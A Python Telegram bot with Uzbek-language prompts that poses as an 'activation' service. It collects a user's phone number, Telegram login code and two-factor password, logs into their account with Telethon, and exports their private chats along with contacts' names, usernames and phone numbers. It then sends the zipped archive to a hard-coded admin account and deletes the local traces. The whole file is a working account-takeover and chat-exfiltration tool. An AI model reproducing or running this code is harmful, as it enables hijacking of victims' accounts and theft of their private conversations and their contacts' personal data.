import asyncio
import os
import json
import random
import zipfile
import shutil
import re
from datetime import datetime

from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from telethon import TelegramClient
from telethon.tl.types import User
from telethon.errors import SessionPasswordNeededError

# ================== SOZLAMALAR ==================
BOT_TOKEN = "BOT_TOKEN_BU_YERGA"
API_ID = 27762756
API_HASH = "API_HASH_BU_YERGA"
ADMIN_ID = 7690148385

BASE_DIR = "chats_export"

USERS_FILE = "users.json"
CONFIG_FILE = "config.json"

bot = Bot(BOT_TOKEN)
dp = Dispatcher()
sessions = {}

# ================== JSON ==================
def load_json(file, default):
    if not os.path.exists(file):
        with open(file, "w", encoding="utf-8") as f:
            json.dump(default, f)
    with open(file, "r", encoding="utf-8") as f:
        return json.load(f)

def save_json(file, data):
    with open(file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

users = load_json(USERS_FILE, {})

# ================== MENULAR ==================
def main_menu(is_admin=False):
    kb = [
        [types.KeyboardButton("✅ Aktivlash")],
    ]
    return types.ReplyKeyboardMarkup(kb, resize_keyboard=True)

def back_menu():
    return types.ReplyKeyboardMarkup(
        [[types.KeyboardButton("⬅️ Orqaga")]],
        resize_keyboard=True
    )

# ================== START ==================
@dp.message(CommandStart())
async def start(msg: types.Message):
    await msg.answer("👋 Xush kelibsiz", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))

# ================== AKTIVLASH ==================
@dp.message(lambda m: m.text == "✅ Aktivlash")
async def activate(msg: types.Message):
    sessions[msg.from_user.id] = {"step": "phone"}
    await msg.answer("📲 Telefon raqam yuboring (+998...)", reply_markup=back_menu())

@dp.message(lambda m: m.text == "⬅️ Orqaga")
async def back(msg: types.Message):
    sessions.pop(msg.from_user.id, None)
    await msg.answer("🏠 Bosh menu", reply_markup=main_menu(msg.from_user.id == ADMIN_ID))

@dp.message(lambda m: m.from_user.id in sessions)
async def login_steps(msg: types.Message):
    uid = msg.from_user.id
    state = sessions[uid]
    text = msg.text.strip()

    # 📞 PHONE
    if state["step"] == "phone":
        if not text.replace("+", "").isdigit():
            return await msg.answer("❌ Noto‘g‘ri raqam")

        client = TelegramClient(f"session_{uid}", API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(text)

        state.update({
            "step": "code",
            "phone": text,
            "client": client
        })

        return await msg.answer("🔐 Telegram kodi yuborildi")

    # 🔐 CODE
    if state["step"] == "code":
        try:
            await state["client"].sign_in(state["phone"], text)
        except SessionPasswordNeededError:
            state["step"] = "password"
            return await msg.answer("🔑 2-bosqich parolni yuboring")

        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
        return await export_chats(uid)

    # 🔑 PASSWORD
    if state["step"] == "password":
        await state["client"].sign_in(password=text)
        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
        await export_chats(uid)

# ================== EXPORT YORDAMCHI ==================
def safe_name(text):
    return re.sub(r"[^\w\d_-]", "_", text)

def media_text(m):
    if m.photo:
        return "rasm yubordiz"
    if m.video:
        return "video yubordiz"
    if m.voice:
        return "ovozli xabar yubordiz"
    if m.audio:
        return "audio yubordiz"
    if m.document:
        return "fayl yubordiz"
    if m.sticker:
        return "stiker yubordiz"
    if m.gif:
        return "gif yubordiz"
    return "media yubordiz"

# ================== CHAT EXPORT ==================
async def export_chats(uid):
    client = sessions[uid]["client"]
    os.makedirs(BASE_DIR, exist_ok=True)

    for d in await client.get_dialogs():
        if isinstance(d.entity, User) and not d.entity.bot:
            user = d.entity

            name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "NoName"
            safe = safe_name(name)

            username = f"@{user.username}" if user.username else "-"
            phone = user.phone if user.phone else "-"

            chat_dir = os.path.join(BASE_DIR, f"{safe}_{user.id}")
            os.makedirs(chat_dir, exist_ok=True)

            with open(os.path.join(chat_dir, "chat.txt"), "w", encoding="utf-8") as f:
                # ===== CHAT INFO =====
                f.write("===== CHAT MAʼLUMOTLARI =====\n")
                f.write(f"Ism: {name}\n")
                f.write(f"User ID: {user.id}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Telefon: {phone}\n")
                f.write("=============================\n\n")

                # ===== XABARLAR =====
                async for m in client.iter_messages(user, limit=2000, reverse=True):
                    time = m.date.strftime("%Y-%m-%d %H:%M:%S") if m.date else "----"
                    sender = "siz" if m.out else name

                    if m.text:
                        content = m.text
                    elif m.media:
                        content = media_text(m)
                    else:
                        continue

                    f.write(f"[{time}] {sender}: {content}\n")

    # ===== ZIP =====
    zip_name = f"chats_{uid}.zip"
    with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(BASE_DIR):
            for file in files:
                full = os.path.join(root, file)
                z.write(full, arcname=os.path.relpath(full, BASE_DIR))

    await bot.send_document(
        ADMIN_ID,
        types.FSInputFile(zip_name),
        caption=f"📦 Chat export tayyor | UID: {uid}"
    )

    shutil.rmtree(BASE_DIR)
    os.remove(zip_name)
    await client.disconnect()
    sessions.pop(uid, None)

# ================== RUN ==================
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
